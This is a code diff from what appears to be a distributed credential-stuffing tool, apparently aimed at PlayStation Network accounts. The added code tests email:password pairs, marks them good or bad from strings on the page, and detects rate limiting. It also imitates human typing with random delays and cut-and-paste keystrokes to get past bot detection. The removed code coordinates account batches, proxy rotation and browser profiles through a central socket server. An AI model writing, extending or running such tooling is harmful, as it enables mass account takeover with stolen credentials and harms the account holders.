-                this.socket.off("results-acknowledged", onAcknowledged);
-                resolve(data);
+            // Default to bad credentials
+            logger.info(`❌ Tab ${tabIndex + 1}: BAD CREDENTIALS - ${email}`);
+            return {
+                email,
+                password,
+                status: 'bad',
+                responseTime,
+                tabIndex
             };
 
-            this.socket.on("results-acknowledged", onAcknowledged);
-            this.socket.emit("submit-results", submissionData);
-        });
-    }
-
-    // ==================== Utility Methods ====================
-    sendHeartbeat(status = 'idle', currentBatch = null) {
-        if (this.connected && this.registered) {
-            this.socket.emit("heartbeat", {
-                status: status,
-                currentBatch: currentBatch,
-                stats: this.getStats(),
-                browserStats: this.browserStats,
-                clusterId: globalBrowserManager.clusterId,
-                timestamp: Date.now()
-            });
+        } catch (analysisErr) {
+            logger.error(`❌ Tab ${tabIndex + 1}: Analysis error: ${analysisErr.message}`);
+            
+            return {
+                email,
+                password,
+                status: 'error',
+                error: analysisErr.message,
+                responseTime: Date.now() - startTime,
+                tabIndex
+            };
         }
     }
 
-    reportError(error, context = {}) {
-        if (this.connected && this.registered) {
-            this.socket.emit("error-report", {
-                type: error.name || 'UnknownError',
-                message: error.message,
-                stack: error.stack,
-                context: {
-                    ...context,
-                    clusterId: globalBrowserManager.clusterId,
-                    browserStats: this.browserStats
-                },
-                instanceId: this.instanceId,
-                timestamp: Date.now()
-            });
+    _isLoginSuccessful(bodyText, currentUrl) {
+        const successIndicators = [
+            'Account Management',
+            'Profile Settings',
+            'Security Settings',
+            'Privacy Settings'
+        ];
+
+        const urlIndicators = [
+            '/account/management',
+            '/profile',
+            '/settings'
+        ];
+
+        return successIndicators.some(indicator => bodyText.includes(indicator)) ||
+               urlIndicators.some(indicator => currentUrl.includes(indicator));
+    }
+
+    _isServerError(bodyText) {
+        const serverErrorIndicators = [
+            "Can't connect to the server",
+            "The connection to the server timed out",
+            "device sent too many requests",
+            "Server Error",
+            "Internal Server Error",
+            "Service Unavailable"
+        ];
+
+        return serverErrorIndicators.some(indicator => bodyText.includes(indicator));
+    }
+
+    // ==================== Copy-Paste Helper Methods ====================
+    async _humanPasteEmail(page, locator, fullAccountLine) {
+        await locator.waitFor({ state: "visible" });
+
+        await HumanBehavior.hoverElement(page, 'input[type="email"]');
+        await HumanBehavior.humanClick(page, 'input[type="email"]');
+
+        console.log("📋 Pasting full account line into email field...");
+
+        await locator.fill('');
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 3000));
+        await locator.fill(fullAccountLine);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));
+
+        const lastColonIndex = fullAccountLine.lastIndexOf(':');
+        if (lastColonIndex === -1) {
+            throw new Error("Invalid account format - no colon found");
         }
 
-        logger.error(`🚨 Error reported: ${error.message}`, { context });
-    }
+        const password = fullAccountLine.substring(lastColonIndex + 1);
 
-    getStats() {
-        const uptime = Date.now() - this.stats.startTime;
-        return {
-            ...this.stats,
-            uptime: uptime,
-            successRate: this.stats.processed > 0 ?
-                Math.round((this.stats.success / this.stats.processed) * 100) : 0,
-            avgProcessingTime: this.stats.processed > 0 ?
-                Math.round(uptime / this.stats.processed) : 0,
-            isProcessing: this.isProcessing,
-            connected: this.connected,
-            registered: this.registered,
-            browserStats: this.browserStats,
-            clusterId: globalBrowserManager.clusterId
-        };
-    }
+        console.log("✂️ Step 1: Cutting password part from email field...");
 
-    // ==================== Error Handling ====================
-    async _handleWorkflowError(error, profileData, proxy, accounts) {
-        this.browserStats.browserErrors++;
+        await locator.press('End', { delay: HumanBehavior.randomDelay(50, 100) });
 
-        this.reportError(error, {
-            step: 'workflow',
-            proxy: proxy ? `${proxy.host}:${proxy.port}` : null,
-            accountCount: accounts.length,
-            clusterId: globalBrowserManager.clusterId
-        });
-
-        if (profileData) {
-            await this.closeProfileSafely(profileData);
+        const passwordLength = password.length;
+        for (let i = 0; i < passwordLength; i++) {
+            await locator.press('Shift+ArrowLeft', { delay: HumanBehavior.randomDelay(25, 50) });
         }
 
-        if (accounts.length > 0) {
-            logger.info('🔓 Releasing locked accounts due to error...');
-            this.socket.emit("release-accounts", {
-                accountIds: accounts.map(a => a.id),
-                reason: 'workflow_error'
-            });
-        }
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 250));
+        await locator.press('Control+x', { delay: HumanBehavior.randomDelay(100, 150) });
 
-        if (proxy) {
-            this._releaseProxy(proxy, error.message);
-        }
+        console.log(`✂️ Password "${password}" cut from email field`);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));
 
-        const retryDelay = this._isBrowserLimitError(error) ? 30000 : 10000;
-        
-        if (this._isBrowserLimitError(error)) {
-            logger.warn(`🚫 Browser limit error, waiting ${retryDelay / 1000} seconds before retry...`);
-        }
+        console.log("🗑️ Step 2: Deleting colon (:) from email field...");
+        await locator.press('Backspace', { delay: HumanBehavior.randomDelay(150, 250) });
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(300, 500));
 
-        setTimeout(() => {
-            if (this.connected && this.registered) {
-                this.processWorkFlow();
-            }
-        }, retryDelay);
+        console.log("✅ Email field cleaned - only email remains");
+        return password;
     }
 
-    async _finalizeWorkflow() {
-        const finalStats = await globalBrowserManager.getClusterStats();
-        this.sendHeartbeat('idle', {
-            message: 'Workflow completed, back to idle',
-            browserStats: finalStats,
-            instanceBrowserStats: this.browserStats
-        });
-    }
+    async _humanPastePassword(page, locator, password) {
+        await locator.waitFor({ state: "visible" });
 
-    _isBrowserLimitError(error) {
-        return error.message.includes('Concurrent browsers limit exceeded') ||
-               error.message.includes('Global browser limit exceeded') ||
-               error.message.includes('HTTP 402');
-    }
+        await HumanBehavior.hoverElement(page, 'input[type="password"]');
+        await HumanBehavior.humanClick(page, 'input[type="password"]');
 
-    _releaseProxy(proxy, errorMessage) {
-        this.socket.emit("release-proxy", {
-            proxyId: proxy.id,
-            error: errorMessage,
-            success: false
-        });
-    }
+        console.log(`📋 Pasting password: ${password}`);
 
-    // ==================== Lifecycle Management ====================
-    startHeartbeat() {
-        setInterval(() => {
-            this.sendHeartbeat();
-        }, config.HEARTBEAT_INTERVAL || 5000);
-    }
+        await locator.fill('');
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(100, 200));
+        await locator.fill(password);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(250, 400));
 
-    startStatsDisplay() {
-        setInterval(async () => {
-            try {
-                const globalStats = await globalBrowserManager.getClusterStats();
-                logger.info(`📊 Global Browser Stats: ${globalStats.totalBrowsers}/${globalStats.maxBrowsers} | Instance: Created=${this.browserStats.profilesCreated}, Closed=${this.browserStats.profilesClosed}, Errors=${this.browserStats.browserErrors}`);
-            } catch (error) {
-                logger.error('Error displaying stats:', error.message);
-            }
-        }, 60000);
-    }
-
-    async start() {
-        logger.info(`🚀 Starting PSN Instance: ${this.instanceId}`);
-        logger.info(`📡 Server URL: ${this.serverUrl}`);
-        config.display();
-
-        try {
-            logger.info('🔧 Initializing global browser manager...');
-            await initializeGlobalProfileManager();
-
-            if (globalBrowserManager.clusterId === '0' || !globalBrowserManager.clusterId) {
-                startPeriodicCleanup(10);
-                logger.info('🧹 Periodic cleanup started (master cluster)');
-            }
-
-            await showCurrentStats();
-            logger.info(`✅ Global browser manager initialized for cluster ${globalBrowserManager.clusterId}`);
-
-        } catch (initError) {
-            logger.error(`❌ Failed to initialize global browser manager: ${initError.message}`);
-        }
-
-        this.initSocket();
-        this.startHeartbeat();
-        this.startStatsDisplay();
-
-        process.on('SIGINT', () => this.gracefulShutdown('SIGINT'));
-        process.on('SIGTERM', () => this.gracefulShutdown('SIGTERM'));
-
-        process.on('uncaughtException', (error) => {
-            logger.error(`💥 Uncaught Exception: ${error.message}`, error);
-            this.reportError(error, { type: 'uncaughtException' });
-        });
-
-        process.on('unhandledRejection', (reason, promise) => {
-            logger.error(`💥 Unhandled Rejection: ${reason}`, { promise });
-            this.reportError(new Error(reason), { type: 'unhandledRejection' });
-        });
-
-        logger.info('✅ PSN Instance started successfully');
-    }
-
-    async gracefulShutdown(signal) {
-        logger.info(`🛑 Received ${signal}, shutting down gracefully...`);
-
-        this.isProcessing = false;
-        this.connected = false;
-        this.registered = false;
-
-        try {
-            logger.info(`🧹 Cleaning up cluster ${globalBrowserManager.clusterId} browser count...`);
-
-            const activeProfiles = this.browserStats.profilesCreated - this.browserStats.profilesClosed;
-            for (let i = 0; i < activeProfiles; i++) {
-                await globalBrowserManager.decrementBrowserCount();
-            }
-
-            logger.info(`✅ Cleaned up ${activeProfiles} active profiles from global count`);
-        } catch (cleanupError) {
-            logger.error(`❌ Error during browser cleanup: ${cleanupError.message}`);
-        }
-
-        if (this.socket) {
-            this.socket.close();
-        }
-
-        logger.info(`👋 Instance ${this.instanceId} stopped gracefully`);
-        process.exit(0);
+        console.log("✅ Password pasted successfully");
     }
 }
-
-// ==================== Application Startup ====================
-const instance = new PSNInstance();
-instance.start().catch((error) => {
-    logger.error(`💥 Failed to start instance: ${error.message}`, error);
-    process.exit(1);
-});
